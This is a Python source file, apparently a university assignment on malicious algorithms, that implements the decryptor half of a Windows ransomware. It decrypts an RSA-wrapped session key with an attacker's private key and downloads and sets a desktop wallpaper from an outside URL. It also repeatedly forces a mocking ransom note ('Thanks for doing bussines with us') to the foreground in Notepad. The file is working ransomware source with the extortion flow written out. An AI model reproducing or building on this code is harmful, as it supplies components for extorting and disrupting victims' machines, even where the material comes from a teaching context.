"""
Cesar Diaz - 1075235
Materia: Algoritmos maliciosos
Entrega: 15/07/2020
<Ransomware: Win32/Win64/NE_AM-v1.A.gen>

Version 1.0 - Decryptor

"""


from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import ctypes #Interactua con windows dlls y cambia el fondo de pantalla
import webbrowser #Se encarga de cargar el browser para redirigir a la pagina especificada
import urllib.request #Usado para descargar y salvar la imagen del background
import os #root del sistema
from os.path import expanduser #Acceso a los directorios y archivos. "
import time
import win32gui
import subprocess

with open('EMAIL_ME.txt', 'rb+') as f:
    enc_fernet_key = f.read()
    print(enc_fernet_key)

# Private RSA key
private_key = RSA.import_key(open('red.pem').read()) #private key #f'{self.sysRoot}\Music\red.pem'

# Private decrypter
private_cryptor = PKCS1_OAEP.new(private_key)

# Decrypted session key
dec_fernet_key = private_cryptor.decrypt(enc_fernet_key)
with open('PUT_ON_DESKTOP.txt', 'wb+') as f:
    f.write(dec_fernet_key)

print(f'> \nPrivate key: {private_key}')
print(f'> Private decrypter: {private_cryptor}')
print(f'> Decrypted fernet key: {dec_fernet_key}')
print('> Decryption Completed')

def Cambiarfondo():
    sys_root = expanduser('~')

    path = f'{sys_root}/Desktop/background.jpg'
    imageUrl = 'https://i.pinimg.com/564x/93/7c/c8/937cc812ee89ee66a0290b737d2b0e34.jpg'
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
    # Access windows dlls for funcionality eg, changing dekstop wallpaper
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

def Notapt2():

    with open('ReadMe_Notept2.txt', 'w') as f:
        f.write(f'''
Thanks for doing bussines with us!! Hope you get all your files back and safe.
''')

    # Open the ransom note
    ransom = subprocess.Popen(['notepad.exe', 'ReadMe_Notept2.txt'])
    count = 0 # Debugging/Testing
    while True:
        time.sleep(0.1)
        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow()) #Este es el metodo que permite a la nota reaparecer y salir al frente
        if top_window == 'ReadMe_Notept2 - Notepad':
            print('\nRansom note is the top window - do nothing') # Debugging/Testing
            pass
        else:
            print('\nRansom note is not the top window - Create it again') # Debugging/Testing

            time.sleep(0.1)
            ransom.kill()
            # Open the ransom note
            time.sleep(0.1)
            ransom = subprocess.Popen(['notepad.exe', 'ReadMe_Notept2'])
        # sleep for 10 seconds)
        count +=1
        if count == 1:
            break
Notapt2()
Cambiarfondo()
